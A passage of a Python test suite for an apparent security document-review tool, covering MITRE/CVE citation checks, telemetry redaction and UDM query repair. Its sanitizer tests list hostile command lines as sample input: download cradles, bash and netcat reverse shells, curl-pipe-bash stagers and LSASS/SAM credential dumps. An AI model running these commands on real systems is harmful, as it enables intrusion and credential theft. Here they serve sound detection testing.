    doc = _make_single_paragraph_doc("doc-mitre-cve", "MITRE & CVE Span Test", body)
    plain_text, index_map = _extract_text_and_index_map(doc)

    comments, edits, findings = find_mitre_and_cve_spans(plain_text, index_map)

    assert len(findings) == 8
    assert len(comments) == 8
    assert len(edits) == 8

    # Ensure valid citations in lines 1 and 2 were not flagged
    by_invalid = {f["invalid_id"]: f for f in findings}
    assert "T1059.001" not in by_invalid
    assert "CVE-2024-21762" not in by_invalid

    expected_mappings = {
        "T1086": ("deprecated_mitre_id", "T1059.001"),
        "T1085": ("deprecated_mitre_id", "T1218.011"),
        "T1059.003": ("mitre_subtechnique_mismatch", "T1059.001"),
        "T1003.002": ("mitre_subtechnique_mismatch", "T1003.001"),
        "T1078.001": ("mitre_subtechnique_mismatch", "T1078.004"),
        "T1098.001": ("mitre_subtechnique_mismatch", "T1098.003"),
        "T1218.010": ("mitre_subtechnique_mismatch", "T1218.011"),
        "CVE-2024-21887": ("cve_vendor_mismatch", "CVE-2024-21762"),
    }
    assert set(by_invalid.keys()) == set(expected_mappings.keys())
    for inv_id, (exp_type, exp_canon) in expected_mappings.items():
        finding = by_invalid[inv_id]
        assert finding["defect_type"] == exp_type
        assert finding["canonical_id"] == exp_canon
        # Confirm exact 1-based UTF-16 span slices back to the exact invalid token
        s_idx = finding["start_index"]
        e_idx = finding["end_index"]
        assert plain_text[s_idx - 1 : e_idx - 1] == inv_id

    # Verify canonical URLs in comment rationales
    cve_finding = by_invalid["CVE-2024-21887"]
    assert "https://nvd.nist.gov/vuln/detail/CVE-2024-21762" in cve_finding["rationale"]
    assert CISA_KEV_CATALOG_URL in cve_finding["rationale"]
    ps_finding = by_invalid["T1086"]
    assert "https://attack.mitre.org/techniques/T1059/001/" in ps_finding["rationale"]


def test_verify_and_redline_mitre_and_cve_in_doc_anchors_comments_and_suggest_edits_with_idempotency():
    """Verifies ``verify_and_redline_mitre_and_cve_in_doc`` executes
    ``insertComment`` before descending-index ``writeMode="SUGGEST"`` edits,
    enriches comments when ``web_verifier_fn`` is provided, and skips spans
    overlapping existing ``suggest.*`` ranges on a second pass."""
    from manager.tools.docs_review_tools import verify_and_redline_mitre_and_cve_in_doc

    doc_text = (
        "Postmortem Attribution:\n"
        "- Case 33269 PowerShell Empire stager: T1086\n"
        "- Case 33288 LSASS comsvcs.dll MiniDump: T1003.002\n"
        "- Edge VPN perimeter advisory on Fortinet FortiOS SSL VPN: CVE-2024-21887\n"
    )
    mock_doc = _make_single_paragraph_doc(
        "doc-mitre-cve-live", "Postmortem MITRE & CVE", doc_text
    )
    batch_calls: list[dict[str, Any]] = []

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=mock_doc)
        payload = json.loads(request.content.decode("utf-8"))
        batch_calls.append(payload)
        if "insertComment" in json.dumps(payload):
            return httpx.Response(
                200,
                json={
                    "replies": [
                        {"insertComment": {"commentId": f"c-mitre-{i}"}}
                        for i in range(len(payload.get("requests", [])))
                    ]
                },
            )
        return httpx.Response(
            200,
            json={
                "documentId": "doc-mitre-cve-live",
                "replies": [{} for _ in payload.get("requests", [])],
            },
        )

    transport = httpx.MockTransport(handler)
    token_source = StaticTokenSource("adc-token")

    verifier_calls: list[dict[str, Any]] = []

    def fake_web_verifier(finding: dict[str, Any]) -> dict[str, Any]:
        verifier_calls.append(finding)
        return {
            "verified": True,
            "summary": f"Confirmed canonical {finding['canonical_id']} ({finding['canonical_name']})",
            "url": finding["reference_url"],
        }

    res = verify_and_redline_mitre_and_cve_in_doc(
        "doc-mitre-cve-live",
        run_web_grounding_check=True,
        web_verifier_fn=fake_web_verifier,
        token_source=token_source,
        transport=transport,
    )

    assert res["status"] == "success"
    assert res["mitre_cve_findings_count"] == 3
    assert res["skipped_existing_suggestion_count"] == 0
    assert res["comments"]["inserted_count"] == 3
    assert res["edits"]["applied_count"] == 3
    assert len(res["grounding_checks"]) == 3
    assert len(verifier_calls) == 3

    # Verify ordering: comments first (no writeControl), SUGGEST edits second
    assert len(batch_calls) == 2
    assert "writeControl" not in batch_calls[0]
    assert batch_calls[1]["writeControl"] == {"writeMode": "SUGGEST"}

    for req in batch_calls[0]["requests"]:
        body_str = req["insertComment"]["content"]
        assert "[Grounded MITRE/CVE Verification:" in body_str

    # Verify descending startIndex ordering on deleteContentRange requests
    delete_starts = [
        req["deleteContentRange"]["range"]["startIndex"]
        for req in batch_calls[1]["requests"]
        if "deleteContentRange" in req
    ]
    assert delete_starts == sorted(delete_starts, reverse=True)

    # Second pass: simulate existing pending suggestion spanning the entire document
    mock_doc_with_suggestions = {
        "documentId": "doc-mitre-cve-live",
        "title": "Postmortem MITRE & CVE",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {
                                    "content": doc_text,
                                    "suggestedDeletionIds": ["suggest.existing.mitre"],
                                },
                            }
                        ]
                    }
                }
            ]
        },
    }
    batch_calls.clear()
    transport2 = httpx.MockTransport(
        lambda req: httpx.Response(200, json=mock_doc_with_suggestions)
    )
    res2 = verify_and_redline_mitre_and_cve_in_doc(
        "doc-mitre-cve-live",
        run_web_grounding_check=True,
        web_verifier_fn=fake_web_verifier,
        token_source=token_source,
        transport=transport2,
    )
    assert res2["mitre_cve_findings_count"] == 0
    assert res2["skipped_existing_suggestion_count"] == 3
    assert res2["comments"]["inserted_count"] == 0
    assert res2["edits"]["applied_count"] == 0
    assert len(batch_calls) == 0


def test_review_google_doc_with_stage_a_includes_and_deduplicates_mitre_cve_spans():
    """Verifies ``review_google_doc_with_stage_a`` automatically runs
    ``find_mitre_and_cve_spans`` (``stage_a_mitre_cve_count``) and deduplicates
    against overlapping Stage B ``semantic_comments`` / ``semantic_edits``."""
    from manager.tools.docs_review_tools import (
        find_mitre_and_cve_spans,
        review_google_doc_with_stage_a,
    )

    doc_text = (
        "Incident Summary:\n"
        "- Deprecated PowerShell Empire technique: T1086\n"
        "- Swapped Fortinet FortiOS SSL VPN KEV advisory: CVE-2024-21887\n"
    )
    mock_doc = _make_single_paragraph_doc(
        "doc-stage-a-mitre", "Stage A MITRE & CVE", doc_text
    )
    plain, idx_map = _extract_text_and_index_map(mock_doc)
    _, mitre_edits, _ = find_mitre_and_cve_spans(plain, idx_map)
    assert len(mitre_edits) == 2
    t1086_span = mitre_edits[0]

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=mock_doc)
        payload = json.loads(request.content.decode("utf-8"))
        return httpx.Response(
            200,
            json={
                "documentId": "doc-stage-a-mitre",
                "replies": [{} for _ in payload.get("requests", [])],
            },
        )

    # Pass an overlapping Stage B edit/comment for T1086 while leaving CVE-2024-21887 to Stage A
    res = review_google_doc_with_stage_a(
        "doc-stage-a-mitre",
        semantic_comments=[
            {
                "start_index": t1086_span["start_index"],
                "end_index": t1086_span["end_index"],
                "comment": "Custom caller comment for T1086.",
            }
        ],
        semantic_edits=[
            {
                "start_index": t1086_span["start_index"],
                "end_index": t1086_span["end_index"],
                "replacement": "T1059.001",
            }
        ],
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(handler),
    )

    assert res["status"] == "success"
    assert res["stage_a_mitre_cve_count"] == 2
    # 1 Stage A edit (CVE-2024-21887) + 1 deduplicated Stage B edit (T1086) = 2 total
    assert res["comments"]["inserted_count"] == 2
    assert res["edits"]["applied_count"] == 2


# ---------------------------------------------------------------------------
# Cycle 5 (H6): Adversarial Telemetry Sanitizer Fuzzing, Forensic Preservation
# & Stage A Sensitive Payload/Secret Span Red-Liner in Google Docs
# ---------------------------------------------------------------------------


def test_sanitize_telemetry_text_adversarial_corpus_25_patterns():
    """Verifies that ``sanitize_telemetry_text`` redacts 25+ offensive command-line
    obfuscation, LOLBin cradle, credential-dumping, Linux reverse-shell, and
    cloud/API credential patterns into deterministic ``<REDACTED_...:sha256=...>``
    tokens while preserving command verbs and maintaining idempotency."""
    from manager.tools.docs_review_tools import sanitize_telemetry_text

    standalone_b64 = (
        "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTk4LjUxLjEwMC40Mi9zdGFnZTIucHMxJyk="
    )
    corpus: list[tuple[str, str, str, str]] = [
        (
            "powershell_enc_short",
            "powershell.exe -NoP -W Hidden -enc aGVsbG8gd29ybGQgdGVzdCBwYXlsb2Fk",
            "aGVsbG8gd29ybGQgdGVzdCBwYXlsb2Fk",
            "<REDACTED_B64:len=32,sha256=",
        ),
        (
            "powershell_encodedcommand_long",
            "pwsh -NoProfile -NonInteractive -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACcA",
            "VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACcA",
            "<REDACTED_B64:len=48,sha256=",
        ),
        (
            "powershell_e_short_flag",
            "powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
            "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
            "<REDACTED_B64:len=56,sha256=",
        ),
        (
            "dotnet_frombase64string_single_quote",
            "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aGVsbG8gd29ybGQgdGVzdCBwYXlsb2Fk'))",
            "aGVsbG8gd29ybGQgdGVzdCBwYXlsb2Fk",
            "FromBase64String('<REDACTED_B64:len=32,sha256=",
        ),
        (
            "dotnet_frombase64string_double_quote",
            '[Convert]::FromBase64String("VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACcA")',
            "VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACcA",
            'FromBase64String("<REDACTED_B64:len=48,sha256=',
        ),
        (
            "standalone_base64_stager_blob",
            f"Decoded stager payload blob: {standalone_b64}",
            standalone_b64,
            f"<REDACTED_B64:len={len(standalone_b64)},sha256=",
        ),
        (
            "net_webclient_downloadstring",
            "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.42/stage2.ps1')",
            "http://198.51.100.42/stage2.ps1",
            "DownloadString(<REDACTED_CRADLE:sha256=",
        ),
        (
            "net_webclient_downloadfile",
            "(New-Object System.Net.WebClient).DownloadFile('http://198.51.100.42/beacon.exe','C:\\Users\\Public\\beacon.exe')",
            "http://198.51.100.42/beacon.exe",
            "DownloadFile(<REDACTED_CRADLE:sha256=",
        ),
        (
            "iwr_pipe_iex",
            "iwr -UseBasicParsing http://198.51.100.42/loader.ps1 | iex",
            "http://198.51.100.42/loader.ps1 | iex",
            "iwr <REDACTED_CRADLE:sha256=",
        ),
        (
            "invoke_restmethod_pipe_invoke_expression",
            "Invoke-RestMethod https://evil-c2.example/implant.ps1 | Invoke-Expression",
            "https://evil-c2.example/implant.ps1 | Invoke-Expression",
            "Invoke-RestMethod <REDACTED_CRADLE:sha256=",
        ),
        (
            "certutil_urlcache_split_f",
            "certutil.exe -urlcache -split -f http://198.51.100.42/payload.exe C:\\Windows\\Temp\\payload.exe",
            "http://198.51.100.42/payload.exe C:\\Windows\\Temp\\payload.exe",
            "certutil.exe -urlcache -split -f <REDACTED_LOLBIN_ARGS:sha256=",
        ),
        (
            "bitsadmin_transfer",
            "bitsadmin /transfer BackdoorJob /download /priority high http://198.51.100.42/stage.dll C:\\Temp\\stage.dll",
            "BackdoorJob /download /priority high http://198.51.100.42/stage.dll C:\\Temp\\stage.dll",
            "bitsadmin /transfer <REDACTED_LOLBIN_ARGS:sha256=",
        ),
        (
            "mshta_vbscript_execute",
            'mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass"",0:close")',
            'Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass"",0:close")',
            "mshta.exe vbscript:<REDACTED_LOLBIN_ARGS:sha256=",
        ),
        (
            "regsvr32_scrobj_squiblydoo",
            "regsvr32.exe /s /n /u /i:http://198.51.100.42/file.sct scrobj.dll",
            "http://198.51.100.42/file.sct scrobj.dll",
            "regsvr32.exe /s /n /u /i:<REDACTED_LOLBIN_ARGS:sha256=",
        ),
        (
            "comsvcs_minidump_lsass",
            "- Hazard 3 (Comsvcs MiniDump Arguments): rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\lsass.dmp full",
            "624 C:\\Windows\\Temp\\lsass.dmp full",
            "(Comsvcs MiniDump Arguments): rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <REDACTED_DUMP_ARGS:sha256=",
        ),
        (
            "procdump_ma_lsass",
            "procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",
            "lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",
            "procdump64.exe -accepteula -ma <REDACTED_DUMP_ARGS:sha256=",
        ),
        (
            "ntdsutil_ifm_create_full",
            'ntdsutil.exe "ac i ntds" "ifm" "create full C:\\Temp\\ntds_extract" q q',
            '"ac i ntds" "ifm" "create full C:\\Temp\\ntds_extract" q q',
            "ntdsutil.exe <REDACTED_DUMP_ARGS:sha256=",
        ),
        (
            "reg_save_hklm_sam",
            "reg.exe save HKLM\\SAM C:\\Windows\\Temp\\sam.hiv /y",
            "C:\\Windows\\Temp\\sam.hiv /y",
            "reg.exe save HKLM\\SAM <REDACTED_DUMP_ARGS:sha256=",
        ),
        (
            "reg_save_hklm_system",
            "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hiv /y",
            "C:\\Windows\\Temp\\system.hiv /y",
            "reg save HKLM\\SYSTEM <REDACTED_DUMP_ARGS:sha256=",
        ),
        (
            "mimikatz_sekurlsa_logonpasswords",
            'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"',
            "logonpasswords",
            "sekurlsa::<REDACTED_DUMP_ARGS:sha256=",
        ),
        (
            "mimikatz_lsadump_dcsync",
            'mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt"',
            "/domain:corp.local /user:krbtgt",
            "lsadump::dcsync <REDACTED_DUMP_ARGS:sha256=",
        ),
        (
            "linux_dev_tcp_reverse_shell",
            "bash -c 'bash -i >& /dev/tcp/198.51.100.42/4444 0>&1'",
            "/dev/tcp/198.51.100.42/4444 0>&1",
            "<REDACTED_REVERSE_SHELL:sha256=",
        ),
        (
            "netcat_dash_e_reverse_shell",
            "nc -nv 198.51.100.42 4444 -e /bin/bash",
            "-nv 198.51.100.42 4444 -e /bin/bash",
            "nc <REDACTED_REVERSE_SHELL:sha256=",
        ),
        (
            "curl_pipe_bash_stager",
            "curl -fsSL http://198.51.100.42/install_miner.sh | sudo bash",
            "-fsSL http://198.51.100.42/install_miner.sh | sudo bash",
            "curl <REDACTED_REVERSE_SHELL:sha256=",
        ),
        (
            "wget_pipe_sh_stager",
            "wget -qO- http://198.51.100.42/bot.sh | sh",
            "-qO- http://198.51.100.42/bot.sh | sh",
            "wget <REDACTED_REVERSE_SHELL:sha256=",
        ),
        (
            "gcp_oauth2_ya29_access_token",
            "Authorization: Bearer ya29" + ".a0AXooCgv9FakeAccessTokenForTesting1234567890abcdef",
            "ya29" + ".a0AXooCgv9FakeAccessTokenForTesting1234567890abcdef",
            "<REDACTED_GCP_TOKEN:sha256=",
        ),
        (
            "jwt_bearer_token_three_part",
            "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            "<REDACTED_JWT:sha256=",
        ),
        (
            "aws_access_key_id_akia",
            "export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE",
            "AKIAIOSFODNN7EXAMPLE",
            "<REDACTED_AWS_KEY:sha256=",
        ),
        (
            "pem_private_key_block",
            "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA0123456789abcdef\n-----END RSA PRIVATE KEY-----",
            "MIIEpAIBAAKCAQEA0123456789abcdef",
            "<REDACTED_PRIVATE_KEY:sha256=",
        ),
    ]

    assert len(corpus) >= 25
    for label, raw_input, forbidden_substring, expected_marker in corpus:
        sanitized = sanitize_telemetry_text(raw_input)
        assert forbidden_substring not in sanitized, f"[{label}] raw payload survived: {sanitized}"
        assert expected_marker in sanitized, f"[{label}] expected token {expected_marker!r} missing in {sanitized!r}"
        # Verify strict idempotency: running sanitize_telemetry_text a second time is a no-op
        assert sanitize_telemetry_text(sanitized) == sanitized, f"[{label}] non-idempotent sanitization"


def test_sanitize_telemetry_text_preserves_forensic_identifiers_100_percent():
    """Verifies that ``sanitize_telemetry_text`` preserves 100% of benign forensic
    identifiers (MD5, SHA-1, SHA-256, UUIDs, Windows SIDs, GCP resource paths,
    service accounts, Chronicle UDM fields, and MITRE/CVE IDs) without false-positive
    redactions."""
    from manager.tools.docs_review_tools import sanitize_telemetry_text

    forensic_lines = [
        "MD5: d41d8cd98f00b204e9800998ecf8427e",
        "SHA-1: da39a3ee5e6b4b0d3255bfef95601890afd80709",
        "SHA-256 (Case 33280 PsExec): e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "SHA-256 (Case 33285 Upper): 7F83B1657FF1FC53B92DC18148A1D65DFC2D4B1FA3D677284ADDD200126D9069",
        "Alert UUID: a13f6726-efed-452e-9008-8fe0d3cb0f75",
        "Windows SID: S-1-5-21-3623811015-3361044348-30300820-1013",
        "GCP Compute Resource: projects/base-production/zones/us-central1-a/instances/production-do-not-delete1",
        "GCP IAM Principal: serviceAccount:hello@base-production.iam.gserviceaccount.com",
        'Chronicle UDM Query: metadata.event_type = "PROCESS_LAUNCH" AND target.process.file.sha256 = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"',
        "MITRE ATT&CK & CISA KEV: T1059.001, T1003.001, T1078.004, T1098.003, CVE-2024-21762, CVE-2024-1709",
        "Narrative prose: Attacker dumped LSASS via rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump and attributed it to T1003.001.",
    ]
    full_block = "\n".join(forensic_lines)
    sanitized = sanitize_telemetry_text(full_block)
    assert sanitized == full_block
    assert "<REDACTED_" not in sanitized


def test_find_telemetry_hazard_spans_and_sanitize_and_redline_telemetry_in_doc_idempotency():
    """Verifies exact 1-based UTF-16 ``start_index`` and ``end_index`` calculation
    in ``find_telemetry_hazard_spans``, descending-index ``writeMode="SUGGEST"``
    batchUpdate requests in ``sanitize_and_redline_telemetry_in_doc``, parity with
    ``sanitize_telemetry_text``, and multi-pass suggestion idempotency."""
    from manager.tools.docs_review_tools import (
        find_telemetry_hazard_spans,
        sanitize_and_redline_telemetry_in_doc,
        sanitize_telemetry_text,
    )

    doc_text = (
        "Incident Telemetry Extract:\n"
        "1. Encoded Stager: powershell.exe -NoP -W Hidden -Enc aGVsbG8gd29ybGQgdGVzdCBwYXlsb2Fk\n"
        "2. Credential Dump: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\lsass.dmp full\n"
        "3. LOLBin Cradle: certutil.exe -urlcache -split -f http://198.51.100.42/beacon.exe C:\\Temp\\beacon.exe\n"
        "4. Reverse Shell: bash -i >& /dev/tcp/198.51.100.42/4444 0>&1\n"
        "5. Leaked GCP Token: Authorization: Bearer ya29" + ".a0AXooCgv9FakeAccessTokenForTesting1234567890abcdef\n"
        "6. Forensic Control SHA-256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\n"
    )
    mock_doc = _make_single_paragraph_doc(
        "doc-telemetry-redline", "Telemetry Redline Test", doc_text
    )
    plain, idx_map = _extract_text_and_index_map(mock_doc)
    comments, edits, findings = find_telemetry_hazard_spans(plain, idx_map)
    assert len(findings) == 5
    assert len(comments) == 5
    assert len(edits) == 5

    # Applying the span replacements back-to-front on plain_text must equal sanitize_telemetry_text(plain_text)
    reconstructed = plain
    for edit in sorted(edits, key=lambda item: item["start_index"], reverse=True):
        c_start = edit["start_index"] - 1
        c_end = edit["end_index"] - 1
        reconstructed = (
            reconstructed[:c_start] + edit["replacement"] + reconstructed[c_end:]
        )
    assert reconstructed == sanitize_telemetry_text(plain)

    batch_calls: list[dict[str, Any]] = []

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=mock_doc)
        payload = json.loads(request.content.decode("utf-8"))
        batch_calls.append(payload)
        if any("insertComment" in r for r in payload.get("requests", [])):
            return httpx.Response(
                200,
                json={
                    "replies": [
                        {"insertComment": {"commentId": f"c-th-{i}"}}
                        for i in range(len(payload.get("requests", [])))
                    ]
                },
            )
        return httpx.Response(
            200,
            json={"replies": [{} for _ in payload.get("requests", [])]},
        )

    res = sanitize_and_redline_telemetry_in_doc(
        "doc-telemetry-redline",
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(handler),
    )
    assert res["status"] == "success"
    assert res["telemetry_hazard_findings_count"] == 5
    assert res["skipped_existing_suggestion_count"] == 0
    assert res["comments"]["inserted_count"] == 5
    assert res["edits"]["applied_count"] == 5
    assert len(batch_calls) == 2
    assert "writeControl" not in batch_calls[0]
    assert batch_calls[1]["writeControl"] == {"writeMode": "SUGGEST"}

    delete_starts = [
        req["deleteContentRange"]["range"]["startIndex"]
        for req in batch_calls[1]["requests"]
        if "deleteContentRange" in req
    ]
    assert delete_starts == sorted(delete_starts, reverse=True)

    # Second pass with pending suggestions covering the document -> 0 new edits, 5 skipped
    mock_doc_pending = {
        "documentId": "doc-telemetry-redline",
        "title": "Telemetry Redline Test",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {
                                    "content": doc_text,
                                    "suggestedDeletionIds": ["suggest.telemetry.existing"],
                                },
                            }
                        ]
                    }
                }
            ]
        },
    }
    batch_calls.clear()
    res2 = sanitize_and_redline_telemetry_in_doc(
        "doc-telemetry-redline",
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(lambda req: httpx.Response(200, json=mock_doc_pending)),
    )
    assert res2["status"] == "success"
    assert res2["telemetry_hazard_findings_count"] == 0
    assert res2["skipped_existing_suggestion_count"] == 5
    assert res2["comments"]["inserted_count"] == 0
    assert res2["edits"]["applied_count"] == 0
    assert len(batch_calls) == 0


def test_review_google_doc_with_stage_a_includes_telemetry_hazard_spans_and_adk_declaration():
    """Verifies that ``review_google_doc_with_stage_a`` automatically runs
    ``find_telemetry_hazard_spans`` (``stage_a_telemetry_hazard_count``),
    recognizes Cloud IMDS SSRF URLs via ``find_deterministic_indicator_spans``,
    and deduplicates overlapping spans cleanly."""
    from google.adk.tools.function_tool import FunctionTool
    from manager.tools import tools as tools_module
    from manager.tools.docs_review_tools import (
        find_deterministic_indicator_spans,
        review_google_doc_with_stage_a,
    )

    doc_text = (
        "Cloud & Endpoint Postmortem:\n"
        "- IMDS SSRF Request: http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token\n"
        "- Stolen GCP Bearer Token: ya29" + ".a0AXooCgv9FakeAccessTokenForTesting1234567890abcdef\n"
        "- Encoded PowerShell: powershell.exe -enc aGVsbG8gd29ybGQgdGVzdCBwYXlsb2Fk\n"
    )
    mock_doc = _make_single_paragraph_doc(
        "doc-stage-a-telemetry", "Stage A Telemetry & IMDS", doc_text
    )
    plain, idx_map = _extract_text_and_index_map(mock_doc)
    url_comments, url_edits = find_deterministic_indicator_spans(plain, idx_map)
    assert len(url_edits) == 1
    assert url_edits[0]["replacement"].startswith("hxxp://169[.]254[.]169[.]254/")
    assert "Cloud IMDS SSRF Hazard" in url_comments[0]["comment"]

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=mock_doc)
        payload = json.loads(request.content.decode("utf-8"))
        return httpx.Response(
            200,
            json={
                "documentId": "doc-stage-a-telemetry",
                "replies": [{} for _ in payload.get("requests", [])],
            },
        )

    res = review_google_doc_with_stage_a(
        "doc-stage-a-telemetry",
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(handler),
    )
    assert res["status"] == "success"
    assert res["stage_a_telemetry_hazard_count"] == 2
    assert res["stage_a_url_count"] == 1
    assert res["comments"]["inserted_count"] == 3
    assert res["edits"]["applied_count"] == 3

    # Verify ADK FunctionTool declaration for sanitize_and_redline_telemetry_in_doc
    ft = FunctionTool(tools_module.sanitize_and_redline_telemetry_in_doc)
    decl = ft._get_declaration()
    assert decl.name == "sanitize_and_redline_telemetry_in_doc"
    props = (decl.parameters_json_schema or {}).get("properties", {})
    assert "document_id" in props
    assert "tool_context" not in props


def test_extract_udm_event_field_values_normalizes_camelcase_and_sanitizes():
    """Verifies camelCase-to-snake_case UDM event flattening across nested dicts/lists
    and confirms offensive payloads inside sampled UDM events are sanitized."""
    from manager.tools.docs_review_tools import (
        _camel_to_snake,
        _extract_udm_event_field_values,
    )

    assert _camel_to_snake("commandLine") == "command_line"
    assert _camel_to_snake("emailAddresses") == "email_addresses"
    assert _camel_to_snake("productEventType") == "product_event_type"
    assert _camel_to_snake("resourceType") == "resource_type"
    assert _camel_to_snake("fullPath") == "full_path"
    assert _camel_to_snake("userId") == "userid"

    sample_event = {
        "name": "projects/dandye-0324-chronicle/locations/us/instances/inst/events/ev-1",
        "udm": {
            "metadata": {
                "eventType": "PROCESS_LAUNCH",
                "logType": "WINDOWS_SYSMON",
                "productEventType": "1",
            },
            "principal": {
                "hostname": "wins-d19",
                "ip": ["10.128.0.21", "104.198.226.161"],
                "user": {
                    "userId": "bruce.wayne",
                    "emailAddresses": ["bruce.wayne@the.org", "admin@the.org"],
                },
            },
            "target": {
                "resource": {
                    "name": "projects/base-production",
                    "resourceType": "CLOUD_PROJECT",
                },
                "process": {
                    "commandLine": "powershell.exe -NoP -W Hidden -Enc aGVsbG8gd29ybGQgdGVzdCBwYXlsb2Fk",
                    "file": {
                        "fullPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
                    },
                },
            },
        },
    }

    flat = _extract_udm_event_field_values(sample_event)
    assert flat["metadata.event_type"] == ["PROCESS_LAUNCH"]
    assert flat["metadata.log_type"] == ["WINDOWS_SYSMON"]
    assert flat["metadata.product_event_type"] == ["1"]
    assert flat["principal.hostname"] == ["wins-d19"]
    assert flat["principal.ip"] == ["10.128.0.21", "104.198.226.161"]
    assert flat["principal.user.userid"] == ["bruce.wayne"]
    assert flat["principal.user.email_addresses"] == [
        "bruce.wayne@the.org",
        "admin@the.org",
    ]
    assert flat["target.resource.name"] == ["projects/base-production"]
    assert flat["target.resource.resource_type"] == ["CLOUD_PROJECT"]
    assert flat["target.process.file.full_path"] == [
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    ]
    assert flat["target.process.file.sha256"] == [
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    ]
    cmd_val = flat["target.process.command_line"][0]
    assert "aGVsbG8gd29ybGQgdGVzdCBwYXlsb2Fk" not in cmd_val
    assert "<REDACTED_B64:len=32,sha256=" in cmd_val


def test_diagnose_zero_hit_udm_query_exact_match_command_line_to_regex():
    """Verifies that a syntactically valid query returning 0 hits due to exact '='
    on a command-line substring is relaxed to its anchor clause, detects the substring,
    synthesizes a case-insensitive regex, and verifies pivot_event_count > 0."""
    from manager.tools.docs_review_tools import diagnose_zero_hit_udm_query

    sample_events = [
        {
            "udm": {
                "metadata": {"eventType": "PROCESS_LAUNCH", "logType": "WINDOWS_SYSMON"},
                "principal": {"hostname": "wins-d19"},
                "target": {
                    "process": {
                        "commandLine": '"C:\\Windows\\system32\\cmd.exe" /c "findstr /si password *.txt"'
                    }
                },
            }
        }
        for _ in range(12)
    ]

    def fake_siem_search(query: str, **kwargs: Any) -> dict[str, Any]:
        if 'target.process.command_line = "cmd.exe"' in query:
            return {"events": [], "total_events": 0}
        if "target.process.command_line = /.*cmd\\.exe.*/ nocase" in query:
            return {"events": sample_events[:4], "total_events": 4}
        if query.strip() == 'principal.hostname = "wins-d19"':
            return {"events": sample_events, "total_events": 12}
        return {"events": [], "total_events": 0}

    diag = diagnose_zero_hit_udm_query(
        'principal.hostname = "wins-d19" AND target.process.command_line = "cmd.exe"',
        siem_search_fn=fake_siem_search,
    )
    assert diag["status"] == "success"
    assert diag["zero_hit"] is True
    assert diag["diagnosis_class"] == "exact_match_on_command_line"
    assert diag["repair_target"] == "rhs"
    assert diag["anchor_query"] == 'principal.hostname = "wins-d19"'
    assert diag["anchor_event_count"] == 12
    assert diag["failing_clause"] == 'target.process.command_line = "cmd.exe"'
    assert diag["recommended_rhs"] == r"/.*cmd\.exe.*/ nocase"
    assert (
        diag["recommended_clause"]
        == r"target.process.command_line = /.*cmd\.exe.*/ nocase"
    )
    assert (
        diag["recommended_query"]
        == r'principal.hostname = "wins-d19" AND target.process.command_line = /.*cmd\.exe.*/ nocase'
    )
    assert diag["pivot_verified"] is True
    assert diag["pivot_event_count"] == 4


def test_diagnose_zero_hit_udm_query_entity_role_swap():
    """Verifies detection and repair when a queried value or regex exists in sampled
    UDM events under a sibling entity role (principal.* vs target.*)."""
    from manager.tools.docs_review_tools import diagnose_zero_hit_udm_query

